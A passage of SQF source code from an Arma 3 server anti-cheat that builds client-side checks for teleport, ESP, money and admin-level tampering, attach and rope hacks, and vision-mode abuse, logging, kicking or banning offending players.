				{
					_curecoil = unitRecoilCoefficient _unit;
					if(_curecoil != 1)then
					{
						_log = format['BadRecoil %1 | %2 %3 %4',_curecoil,typeOf _unit,typeOf (vehicle _unit),currentWeapon _unit];
						[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				};
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_IAC)then{ _A3AHstring = _A3AHstring + "
				_gpsmapstate = false;
				_gpsmapend = false;
				if((!visiblemap)&&!('ItemMap' in (assignedItems player))&&!('ItemGPS' in (assignedItems player)))then
				{
					_gpsmapstate = true;
				};
				"; }; _A3AHstring = _A3AHstring + "
		uiSleep 0.2;
				"; if(_IAC)then{ _A3AHstring = _A3AHstring + "
				if(_gpsmapstate)then
				{
					if((visiblemap)&&('ItemMap' in (assignedItems player))&&('ItemGPS' in (assignedItems player)))then
					{
						_gpsmapend = true;
					};
				};
				if(_gpsmapend)then
				{
					_log = 'ItemsAdded: Suddenly had a GPS and a Map Item..';
					[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				"; }; _A3AHstring = _A3AHstring + "
				_uid = getPlayerUID player;
				if((_uid != '') && {_puid != _uid} && {alive player})then{
					_log = format['_puid != _uid (%1/%2) - BANNED MEMORYHACK',_puid,_uid];
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				"; if(_CLM)then{ _A3AHstring = _A3AHstring + "
					if(!isNil'"+_MC+"')then{"+_MC+"=nil;};
					_MCCODE =
					{
						"+_MC+"=nil;
						_array = _this select 1;
						_a = ['_USER_DEFINED','[',']'];
						if("+str _UMW+")then{_a = _a + "+str _aLocalM+";};
						_foundbad = [];
						
						_allMapMarkers = allMapMarkers;
						_allMapMarkers = _allMapMarkers - ['"+_MAKE_VAR_DUMP_RANDOM+"'];
						_allMapMarkers = _allMapMarkers - ['"+_MAKE_VAR_DUMP_CLIENT+"'];
						{
							_m = _x;
							_lowm = toLower _m;
							if(_m != '')then
							{
								if(_lowm find 'swag' != -1)then
								{
									_foundbad pushBack _m;
									_mtext = markerText _m;
									if(_mtext != '')then{_foundbad pushBack _mtext;};
								}
								else
								{
									if!(_m in _array)then
									{
										_do = true;
										{if(_lowm find (toLower _x) != -1)exitWith{_do = false;};} forEach _a;
										if(_do)then
										{
											_foundbad pushBack _m;
											_mtext = markerText _m;
											if(_mtext != '')then{_foundbad pushBack _mtext;};
										};
									};
								};
							};
						} forEach _allMapMarkers;
						if(str _foundbad != '[]')then
						{
							_log = format['LocalMarker: %1',_foundbad];
							[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					};
					'"+_MC+"' addPublicVariableEventHandler _MCCODE;
				"; }; _A3AHstring = _A3AHstring + "
			};
			_log = 'Loop #12 ended!';
			[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
		"; if((_CMC)||(_KCM))then{ _A3AHstring = _A3AHstring + "
			[_name,_puid] spawn {
				private['_name','_puid','_find1','_find2','_cMenu','_commandingMenu'];
				_name = _this select 0;
				_puid = _this select 1;
				_find1 = toLower('#USER');
				_find2 = ['#User:BIS_fnc_addCommMenuItem_menu','#User:BIS_Menu_GroupCommunication'];
				_cMenu = "+str _cMenu+";
				while{1==1}do
				{
					"; if(_CMC)then{ _A3AHstring = _A3AHstring + "
						_commandingMenu = commandingMenu;
						if(_commandingMenu != '')then
						{
							if(_commandingMenu in _find2)then
							{
								showCommandingMenu '';
							}
							else
							{
								if!(_commandingMenu in _cMenu)then
								{
									if(((toLower _commandingMenu) find _find1) != -1)then
									{
										_log = format['BadCommandingMenu: %1',_commandingMenu];
										[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									};
									showCommandingMenu '';
								};
							};
						};
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_KCM)then{ _A3AHstring = _A3AHstring + "
						showCommandingMenu '';
					"; }; _A3AHstring = _A3AHstring + "
					uiSleep 0.75;
				};
				_log = 'Loop #13 ended!';
				[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
		"; }; _A3AHstring = _A3AHstring + "
		"+_ninetwothread+" = [_name,_puid] spawn {
			_name = _this select 0;
			_puid = _this select 1;
			_waitTime = 60;
			_mytime = diag_tickTime;
			waitUntil {((!isNil '"+_ninetwo+"') || (diag_tickTime > _mytime + _waitTime))};
			if(isNil '"+_ninetwo+"')exitWith
			{
				_log = format['Secondary checks not running.. (KICKED) - waited %1s',diag_tickTime - (_mytime + _waitTime)];
				[_name,_puid,'SLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
				(findDisplay 46)closeDisplay 0;
			};
		};
		[_name,_puid,_admins] spawn {
			_name = _this select 0;
			_puid = _this select 1;
			_admins = _this select 2;
			_ForbiddenItems = "+str _ForbiddenItems+";
			"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
				_ForbiddenOnEpochOnly = "+str _ForbiddenOnEpochOnly+";
				_ForbiddenItems = _ForbiddenItems + _ForbiddenOnEpochOnly;
				{if(isNil _x)then{missionNameSpace setVariable[_x,[]];};} forEach ['EPOCH_ESP_TARGETS','EPOCH_ESPMAP_TARGETS','EPOCH_ESP_VEHICLEPLAYER','EPOCH_ESPGROUPS','EPOCH_ESPGROUPCOLORS'];
				{if(isNil _x)then{missionNameSpace setVariable[_x,false];};} forEach ['EPOCH_ESP_PLAYER','EPOCH_ESP_VEHICLES'];
				if(isNil 'EPOCH_target')then{EPOCH_target = objNull;};
				if(isNil 'EPOCH_currentVehicle')then{EPOCH_currentVehicle = vehicle player;};
				if(isNil 'EPOCH_playerEnergy')then{EPOCH_playerEnergy = 0;};
				if(isNil 'EPOCH_playerHunger')then{EPOCH_playerHunger = 5000;};
				if(isNil 'EPOCH_playerThirst')then{EPOCH_playerThirst = 2500;};
				if(isNil 'EPOCH_playerStamina')then{EPOCH_playerStamina = 100;};
				if(isNil 'EPOCH_antiWallCount')then{EPOCH_antiWallCount = 0;};
				if(isNil 'EPOCH_taxRate')then{EPOCH_taxRate = 0.1;};
				if(isNil 'EPOCH_playerCrypto')then{EPOCH_playerCrypto = 0;};
				"; if(_CCT)then{ _A3AHstring = _A3AHstring + "
					if(EPOCH_playerCrypto < 0)then{EPOCH_playerCrypto = 0;};if(EPOCH_playerCrypto > 250000)then{EPOCH_playerCrypto = 250000;};
				"; }; _A3AHstring = _A3AHstring + "
				if(isNil 'EPOCH_clientInit')then{EPOCH_clientInit = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_clientInit.sqf';};
				if(isNil 'EPOCH_onEachFrame')then{EPOCH_onEachFrame = compile preprocessFileLineNumbers 'epoch_code\compile\EPOCH_onEachFrame.sqf';};
				if(isNil 'EPOCH_client_rejectPlayer')then{EPOCH_client_rejectPlayer = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_client_rejectPlayer.sqf';};
				if(isNil 'EPOCH_clientRespawn')then{EPOCH_clientRespawn = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_clientRespawn.sqf';};
				if(isNil 'EPOCH_fnc_playerDeath')then{EPOCH_fnc_playerDeath = compile preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_fnc_playerDeath.sqf';};
				if(isNil 'EPOCH_KeyDown')then{EPOCH_KeyDown = compile preprocessFileLineNumbers 'epoch_code\compile\interface_event_handlers\EPOCH_KeyDown.sqf';};
				if(isNil 'EPOCH_pushCustomVar')then{EPOCH_pushCustomVar = compile preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_pushCustomVar.sqf';};
				if(isNil 'EPOCH_fnc_playerFired')then{EPOCH_fnc_playerFired = compileFinal preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_fnc_playerFired.sqf';};
				_EPOCH_clientInit = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_clientInit.sqf';
				_EPOCH_onEachFrame = compile preprocessFileLineNumbers 'epoch_code\compile\EPOCH_onEachFrame.sqf';
				_EPOCH_client_rejectPlayer = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_client_rejectPlayer.sqf';
				_EPOCH_clientRespawn = compile preprocessFileLineNumbers 'epoch_code\compile\setup\EPOCH_clientRespawn.sqf';
				_EPOCH_fnc_playerDeath = compile preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_fnc_playerDeath.sqf';
				_EPOCH_KeyDown = compile preprocessFileLineNumbers 'epoch_code\compile\interface_event_handlers\EPOCH_KeyDown.sqf';
				_EPOCH_pushCustomVar = compile preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_pushCustomVar.sqf';
				_EPOCH_fnc_playerFired = compileFinal preprocessFileLineNumbers 'epoch_code\compile\functions\EPOCH_fnc_playerFired.sqf';
				_rnd1 = round(random 99999);life_cash = _rnd1;
				_rnd2 = round(random 99999);life_adminlevel = _rnd2;
				_rnd3 = round(random 99999);life_coplevel = _rnd3;
				_rnd4 = round(random 99999);life_fnc_MPexec = _rnd4;
				_rnd5 = round(random 99999);life_atmbank = _rnd5;
			"; }; _A3AHstring = _A3AHstring + "
			_caeM1 = 0;
			_caeM2 = 0;
			_vehptype = typeOf (vehicle player);
			_rnd6 = round(random 99999);"+_checkidicheckcheck+" = _rnd6;
			if(isNil'inSafeZone')then{inSafeZone=false;};
			_fnc_hasTV = {
				if('optic_tws' in _primWeapItems)exitWith{false};
				if('optic_tws_mg' in _primWeapItems)exitWith{false};
				if('optic_mas_term' in _primWeapItems)exitWith{false};
				if('Laserdesignator' in _primWeapItems)exitWith{false};
				if('acc_mas_pointer_IR' in _primWeapItems)exitWith{false};
				if('acc_pointer_IR' in _primWeapItems)exitWith{false};
				true
			};
			_fnc_hasNV = {
				if('optic_Nightstalker' in _primWeapItems)exitWith{false};
				if('optic_NVS' in _primWeapItems)exitWith{false};
				true
			};
			"; if(_OMC || _MBC)then{ _A3AHstring = _A3AHstring + "
				"+_clickOnMapTimer+" = 0;
				_MBCS = '
					[] spawn {
						uiSleep 0.5;
						if(isNil''"+_clickOnMapTimer+"'')then{"+_clickOnMapTimer+"=time - 100;}else{if(typeName "+_clickOnMapTimer+" != ''SCALAR'')then
						{
							_log = ''MapSingleClick modified - VARIABLE TYPE CHANGED - BAN.'';
							[profileName,getPlayerUID player,''BAN'',toArray(_log)] call "+_AH1311KICKLOG+";
							(findDisplay 46)closeDisplay 0;
						};};
						if(time - "+_clickOnMapTimer+" > 5)then
						{
							"+_clickOnMapTimer+" = time;
							onMapSingleClick ''"+_clickOnMapTimer+" = time;'';
							if(isNil''"+_clickOnMapCaught+"'')then{"+_clickOnMapCaught+" = 0};
							"+_clickOnMapCaught+" = "+_clickOnMapCaught+" + 1;
							if("+_clickOnMapCaught+" >= 3)then
							{
								_log = ''MapSingleClick modified - probably Teleport Hack'';
								[profileName,getPlayerUID player,''SLOG_SKICK'',toArray(_log)] call "+_AH1311KICKLOG+";
							};
						};
					};
				';
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_OMC)then{ _A3AHstring = _A3AHstring + "
				onMapSingleClick '"+_clickOnMapTimer+" = time;';
				((findDisplay 12) displayCtrl 51) ctrlSetEventHandler ['MouseButtonClick',_MBCS];
				((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ['MouseButtonClick',_MBCS];
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_MOH)then{ _A3AHstring = _A3AHstring + "
				_lastidMouseMoving1251 = 0;
				_idMouseMoving1251 = 0;
				_caughtMouseMoving = 0;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_MBC)then{ _A3AHstring = _A3AHstring + "
				_lastidMouseButtonClick1251 = 0;
				_idMouseButtonClick1251 = 0;
				_caughtMouseButtonClick = 0;
				(findDisplay 12 displayCtrl 51) ctrlRemoveAllEventHandlers 'MouseButtonClick';
			"; }; _A3AHstring = _A3AHstring + "
			while{1==1}do
			{
				if(typeName _puid != 'STRING')then
				{
					_log = format['PUID BROKEN: %1',_puid];
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				"; if(_MOH)then{ _A3AHstring = _A3AHstring + "
					_lastidMouseMoving1251 = _idMouseMoving1251+1;
					_idMouseMoving1251 = ((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ['MouseMoving',''];
					if(_lastidMouseMoving1251 != _idMouseMoving1251)then
					{
						if(_caughtMouseMoving > 1)then
						{
							_log = format['MouseMoving EventHandler added (KICKED TO LOBBY):   %1 should be %2',_lastidMouseMoving1251,_idMouseMoving1251];
							[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
							(findDisplay 46)closeDisplay 0;
						};
						_caughtMouseMoving = _caughtMouseMoving + 1;
					};
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_MBC)then{ _A3AHstring = _A3AHstring + "
					"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					_lastidMouseButtonClick1251 = _idMouseButtonClick1251;
					"; }else{ _A3AHstring = _A3AHstring + "
					_lastidMouseButtonClick1251 = _idMouseButtonClick1251+1;
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_OMC)then{ _A3AHstring = _A3AHstring + "
						((findDisplay 12) displayCtrl 51) ctrlSetEventHandler ['MouseButtonClick',_MBCS];
						_idMouseButtonClick1251 = ((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ['MouseButtonClick',_MBCS];
					"; }; _A3AHstring = _A3AHstring + "
					if(_lastidMouseButtonClick1251 != _idMouseButtonClick1251)then
					{
						if(_caughtMouseButtonClick > 1)then
						{
							_log = format['MouseButtonClick EventHandler added (KICKED TO LOBBY):   %1 should be %2',_lastidMouseButtonClick1251,_idMouseButtonClick1251];
							[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
							(findDisplay 46)closeDisplay 0;
						};
						_caughtMouseButtonClick = _caughtMouseButtonClick + 1;
					};
				"; }; _A3AHstring = _A3AHstring + "
				if(isNil 'inSafeZone')then
				{
					_log = 'inSafeZone is Nil';
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				}
				else
				{
					if(typeName inSafeZone != 'BOOL')then
					{
						_log = format['inSafeZone type changed: %1 - %2',typeName inSafeZone,inSafeZone];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				};
				if(isNil '"+_checkidicheckcheck+"')then
				{
					_log = 'AntiAntiHack #2';
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				if!(_rnd6 isEqualTo "+_checkidicheckcheck+")then
				{
					_log = 'AntiAntiHack #3';
					[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
				"; if(_UFI||_UIW)then{ _A3AHstring = _A3AHstring + "
					_inventory = [];
					{_inventory pushBack _x;} forEach (assignedItems player);
					{_inventory pushBack _x;} forEach (magazines player);
					{_inventory pushBack _x;} forEach (weapons player);
					{_inventory pushBack _x;} forEach (primaryWeaponItems player);
					{_inventory pushBack _x;} forEach (secondaryWeaponItems player);
					_inventory pushBack (primaryWeapon player);
					_inventory pushBack (secondaryWeapon player);
					_inventory pushBack (uniform player);
					_inventory pushBack (vest player);
					_inventory pushBack (backpack player);
					_inventory pushBack (headgear player);
					_inventory pushBack (goggles player);
					if!(_inventory isEqualTo [])then
					{
						{
							if(_x != '')then
							{
								if((_x in _ForbiddenItems) || (("+str _UIW+") && !(_x in "+str _ItemWhiteList+")))then
								{
									player removeItem _x;
									player removeWeapon _x;
									player removeMagazine _x;
									if((uniform player) == _x)then{removeUniform player;};
									if((vest player) == _x)then{removeVest player;};
									if((backpack player) == _x)then{removeBackpack player;};
									if((headgear player) == _x)then{removeHeadgear player;};
									if((goggles player) == _x)then{removeGoggles player;};
									player removePrimaryWeaponItem _x;
									player removeSecondaryWeaponItem _x;
									player unlinkItem _x;
									_log = format['BadItem: %1 (might have been from an admin!)',_x];
									[_name,_puid,'SLOG',toArray(_log)] call "+_AH1311KICKLOG+";
								};
							};
						} forEach _inventory;
					};
				"; }; _A3AHstring = _A3AHstring + "
				if(!isNull player)then
				{
					"; if(_CVM)then{ _A3AHstring = _A3AHstring + "
						if(player == vehicle player)then
						{
							private['_curwep','_pvision','_primWeapItems','_pitems'];
							_curwep=currentWeapon player;
							_pvision=currentVisionMode player;
							_primWeapItems=primaryWeaponItems player;
							_pitems=items player;
							if('Rangfinder_mas_h' in _pitems)exitWith{};
							if((_pvision > 1)&&(call _fnc_hasTV))then
							{
								_log = format['BadVisionMode: Thermal (%1) current weapon: %2 | weaponsItems player: %3',_pvision,_curwep,weaponsItems player];
								[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
								(findDisplay 46)closeDisplay 0;
							};
							"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
								if((_pvision == 1)&&(str EPOCH_playerEnergy == '0')&&(call _fnc_hasNV))then
								{
									player action['nvGogglesOff',player];
									uiSleep 0.5;
									_pvision=currentVisionMode player;
									if((_pvision == 1)&&(str EPOCH_playerEnergy == '0'))exitWith
									{
										_log = format['BadVisionMode: Nightvision (%1) current weapon: %2 | weaponsItems player: %3 | EPOCH_playerEnergy: %4',_pvision,_curwep,weaponsItems player,EPOCH_playerEnergy];
										[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
										(findDisplay 46)closeDisplay 0;
									};
								};
							"; }; _A3AHstring = _A3AHstring + "
						};
					"; }; _A3AHstring = _A3AHstring + "
					"; if(_LVC)then{ _A3AHstring = _A3AHstring + "
						_veh = vehicle player;
						if(!(player isEqualTo _veh) && !(_vehptype isEqualTo (typeOf _veh)))then
						{
							_vehptype = typeOf _veh;
							if((toLower _vehptype) find 'chute' == -1)then
							{
								[_name,_puid,'LVC',player,_vehptype,mapGridPosition _veh] call "+_AH1311KICKLOG+";
							};
						};
					"; }; _A3AHstring = _A3AHstring + "
				};
				"; if(_MIC)then{ _A3AHstring = _A3AHstring + "
					_twelvewasactive = false;
					if(!isNull (findDisplay 12 displayCtrl 51))then
					{
						_twelvewasactive = true;
						_caeM1 = (findDisplay 12 displayCtrl 51) ctrlAddEventHandler ['Draw',''];
					};
				"; }; _A3AHstring = _A3AHstring + "
				uiSleep 2;
				"; if(_MIC)then{ _A3AHstring = _A3AHstring + "
					if((_twelvewasactive) && (!isNull (findDisplay 12 displayCtrl 51)))then
					{
						_caeM2 = (findDisplay 12 displayCtrl 51) ctrlAddEventHandler ['Draw',''];
						if(_caeM2 - _caeM1 > 1)then
						{
							if((("+str _MOD+" == 'AltisLife')&&(side player != west))||("+str _MOD+" != 'AltisLife'))then
							{
								_log = format['MapIcons (%1/%2)',_caeM1,_caeM2];
								[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						};
					};
				"; }; _A3AHstring = _A3AHstring + "
				"; if(_CVD)then{ _A3AHstring = _A3AHstring + "
					if(viewDistance > 1600)then{
						_log = format['viewDistance %1/1600',viewDistance];
						[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				"; }; _A3AHstring = _A3AHstring + "
				if(!isNull player)then
				{
					if(alive player)then
					{
						"; if(_CCO)then{ _A3AHstring = _A3AHstring + "
							_con = vehicle cameraOn;
							_veh = vehicle player;
							if(!(_con isEqualTo _veh) && {(!isNull _con) && (player isEqualTo driver (_veh))})then
							{
								uiSleep 1;
								_con = vehicle cameraOn;
								_veh = vehicle player;
								if(alive player)then
								{
									if((_con != _veh) && (!isNull _con) && (player isEqualTo driver (_veh)) && {_con distance _veh > 150} && {(("+str _MOD+" != 'KOTH') || (str(typeOf _con) find 'UAV' == -1))})then
									{
										_log = format['cameraOn: %1 [%2] should be %3 [%4]',typeOf _con,_con,typeOf _veh,_veh];
										[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
										[] spawn "+_AHKickOFF+";
									};
								};
							};
						"; }; _A3AHstring = _A3AHstring + "
							_closeObjects = (player nearObjects 15);
							if(!isNil'_closeObjects')then
							{
								{
									if(!isNull _x)then
									{
										if(_x isEqualTo player)exitWith{};
										_type = typeOf _x;
										
										(vehicle player) enableCollisionWith _x;player enableCollisionWith _x;
										"; if(_OAO)then{ _A3AHstring = _A3AHstring + "
										removeAllActions _x;
										"; }; _A3AHstring = _A3AHstring + "
										
										if(_type == 'Box_IND_AmmoVeh_F')then
										{
											_var = _x getVariable['"+_adminbox+"',''];
											if(!isNil '_var')then
											{
												if(_var == '')then{player setPosATL (player modelToWorld [0,-8,0]);};
											};
										};
									};
								} forEach _closeObjects;
							};
						"; if(_KFR)then{ _A3AHstring = _A3AHstring + "
							_veh = vehicle player;
							if(_veh != player)then
							{
								_veh enableRopeAttach false;
								_ropes = ropes _veh;
								if!(_ropes isEqualTo [])then
								{
									_log = format['RopeHack?: %1',_ropes];
									[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
									{ropeDestroy _x;} forEach _ropes;
								};
							};
						"; }; _A3AHstring = _A3AHstring + "
						"; if(_RPR)then{ _A3AHstring = _A3AHstring + "
						if(!isNull objectParent player)then
						{
							_veh = vehicle player;
							_ropeAttachedObjects = ropeAttachedObjects _veh;
							if!(_ropeAttachedObjects isEqualTo [])then
							{
								{
									_attachedobj = _x;
									_alivecounter = {alive _x} count (crew _attachedobj);
									if(_alivecounter > 0)then
									{
										{ropeDestroy _x;} forEach (ropes _veh);
										{ropeDestroy _x;} forEach (ropes _attachedobj);
									};
								} forEach _ropeAttachedObjects;
							};
						};
						"; }; _A3AHstring = _A3AHstring + "
						_closeveh = [vehicle player] + ((vehicle player) nearEntities ['AllVehicles',250]);
						{
							_xobj = _x;
							if(!isNull _xobj)then
							{
								_attcheXdobjects = attachedObjects _x;
								if(count _attcheXdobjects > 0)then
								{
									_cntQd = {(toLower (typeOf _x)) find 'quad' != -1} count _attcheXdobjects;
									if(_cntQd > 5)then
									{
										detach _xobj;
										{detach _x;} forEach _attcheXdobjects;
										if(_xobj == vehicle player)then
										{
											_log = format['AttachTo Hack @%1 %2',position _xobj,mapGridPosition _xobj];
											[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
											[] spawn "+_AHKickOFF+";
										}
										else
										{
											_log = format['Attached Objects found @%1 %2  Hack?!',position _xobj,mapGridPosition _xobj];
											[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
										};
									};
									"; if(_CAO)then{ _A3AHstring = _A3AHstring + "
										_pobject = vehicle player;
										if(!isNil '_pobject')then
										{
											if(!isNull _pobject)then
											{
												if(alive _pobject)then
												{
													if(_pobject in _attcheXdobjects)then
													{
														_log = format['AttachTo Hack: %1   @%2 %3',name _xobj,position player,mapGridPosition player];
														[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
														[] spawn "+_AHKickOFF+";
													};
												};
											};
										};
									"; }; _A3AHstring = _A3AHstring + "
								};
								"; if(_RVR)then{ _A3AHstring = _A3AHstring + "
									_firstx = _xobj;{ropeDestroy _x;} forEach (ropes _firstx);
								"; }; _A3AHstring = _A3AHstring + "
							};
						} forEach _closeveh;
					};
				};
				"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
					{
						if(isNil _x)then
						{
							_log = format['BadDefinition: %1 is Nil',_x];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						}
						else
						{
							_var = missionNamespace getVariable _x;
							if(typeName _var != 'SCALAR')then
							{
								_log = format['BadDefinition: %1 is not SCALAR (%2)',_x,typeName _var];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						};
					} forEach [
						'life_cash','life_adminlevel','life_coplevel','life_fnc_MPexec','life_atmbank',
						'EPOCH_playerEnergy','EPOCH_playerHunger','EPOCH_playerThirst','EPOCH_playerStamina',
						'EPOCH_playerCrypto','EPOCH_antiWallCount','EPOCH_taxRate'
					];
					
					{
						if(isNil _x)then
						{
							_log = format['BadDefinition: %1 is Nil',_x];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						}
						else
						{
							_var = missionNamespace getVariable _x;
							if(str _var != '[]')then
							{
								_log = format['BadDefinition: %1',_x];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							};
						};
					} forEach [
						'EPOCH_ESP_TARGETS','EPOCH_ESPMAP_TARGETS','EPOCH_ESP_VEHICLEPLAYER','EPOCH_ESPGROUPS','EPOCH_ESPGROUPCOLORS'
					];
					{
						if(isNil _x)then
						{
							_log = format['BadDefinition: %1 is Nil',_x];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						}
						else
						{
							_var = missionNamespace getVariable _x;
							if(typeName _var != 'BOOL')then
							{
								_log = format['BadDefinition: %1 is not BOOL',_x];
								[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
								[] spawn "+_AHKickOFF+";
							}
							else
							{
								if(_var)then
								{
									_log = format['BadDefinition: %1 is TRUE',_x];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							};
						};
					} forEach [
						'EPOCH_ESP_PLAYER','EPOCH_ESP_VEHICLES'
					];
					
					if!(_rnd1 isEqualTo life_cash)then
					{
						[_name,_puid,'BAN',toArray(format['Altis Life Money Hack: [%1] should be [%2]',life_cash,_rnd1])] call "+_AH1311KICKLOG+";[] spawn "+_AHKickOFF+";
					};
					if!(_rnd2 isEqualTo life_adminlevel)then
					{
						[_name,_puid,'BAN',toArray(format['Altis Life Adminlevel Hack: [%1] should be [%2]',life_adminlevel,_rnd2])] call "+_AH1311KICKLOG+";[] spawn "+_AHKickOFF+";
					};
					if!(_rnd3 isEqualTo life_coplevel)then
					{
						[_name,_puid,'BAN',toArray(format['Altis Life Coplevel Hack: [%1] should be [%2]',life_coplevel,_rnd3])] call "+_AH1311KICKLOG+";[] spawn "+_AHKickOFF+";
					};
					if!(_rnd4 isEqualTo life_fnc_MPexec)then
					{
						[_name,_puid,'BAN',toArray(format['Altis Life Hack: life_fnc_MPexec [%1] should be [%2]',life_fnc_MPexec,_rnd4])] call "+_AH1311KICKLOG+";[] spawn "+_AHKickOFF+";
					};
					if!(_rnd5 isEqualTo life_atmbank)then
					{
						[_name,_puid,'BAN',toArray(format['Altis Life Hack: life_atmbank [%1] should be [%2]',life_atmbank,_rnd5])] call "+_AH1311KICKLOG+";[] spawn "+_AHKickOFF+";
					};
					if(isNil 'EPOCH_target')then
					{
						_log = 'BadDefinition: EPOCH_target is Nil';
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					}
					else
					{
						if(typeName EPOCH_target != 'OBJECT')then
						{
							_log = 'BadDefinition: EPOCH_target is not an Object';
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						}
						else
						{
							if(!isNull EPOCH_target)then
							{
								if(EPOCH_target isEqualTo player)then
								{
									_log = format['setVelocityTarget: %1', EPOCH_target];
									[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
									[] spawn "+_AHKickOFF+";
								};
							};
						};
					};
					if(EPOCH_playerEnergy > 2500 || EPOCH_playerEnergy < -10)then
					{
						_log = format['Energy: %1',EPOCH_playerEnergy];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
					if(EPOCH_playerHunger > 5000 || EPOCH_playerHunger < 0)then
					{
						_log = format['Hunger: %1',EPOCH_playerHunger];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
					if(EPOCH_playerThirst > 2500 || EPOCH_playerThirst < 0)then
					{
						_log = format['Thirst: %1',EPOCH_playerThirst];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
					if(EPOCH_playerStamina > 2500 || EPOCH_playerStamina < 0)then
					{
						_log = format['Stamina: %1',EPOCH_playerStamina];
						[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
					"; if(_CCT)then{ _A3AHstring = _A3AHstring + "
						if(EPOCH_playerCrypto > 250000)then
						{
							_log = format['Crypto: %1',EPOCH_playerCrypto];
							[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
						if(EPOCH_playerCrypto < 0)then
						{
							_log = format['Crypto: %1 (reverted to 0)',EPOCH_playerCrypto];
							[_name,_puid,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
							EPOCH_playerCrypto = 0;
							true call EPOCH_pushCustomVar;
						};
					"; }; _A3AHstring = _A3AHstring + "
					
					{
